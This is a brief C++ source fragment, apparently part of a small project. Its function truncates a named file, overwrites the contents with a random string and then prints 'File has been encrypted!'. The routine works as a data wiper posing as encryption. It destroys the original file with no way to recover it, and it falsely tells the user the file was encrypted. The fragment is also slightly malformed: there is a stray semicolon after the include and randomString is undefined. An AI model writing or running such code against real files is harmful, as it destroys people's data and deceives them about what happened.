#include "Primary Feature 1.h";

void primaryFeature1(string fileName) {
	ofstream fileBreaker;
	fileBreaker.open(fileName, ofstream::out | ofstream::trunc);
	fileBreaker << randomString;
	fileBreaker.close();
	cout << "File has been encrypted!" << endl;
}
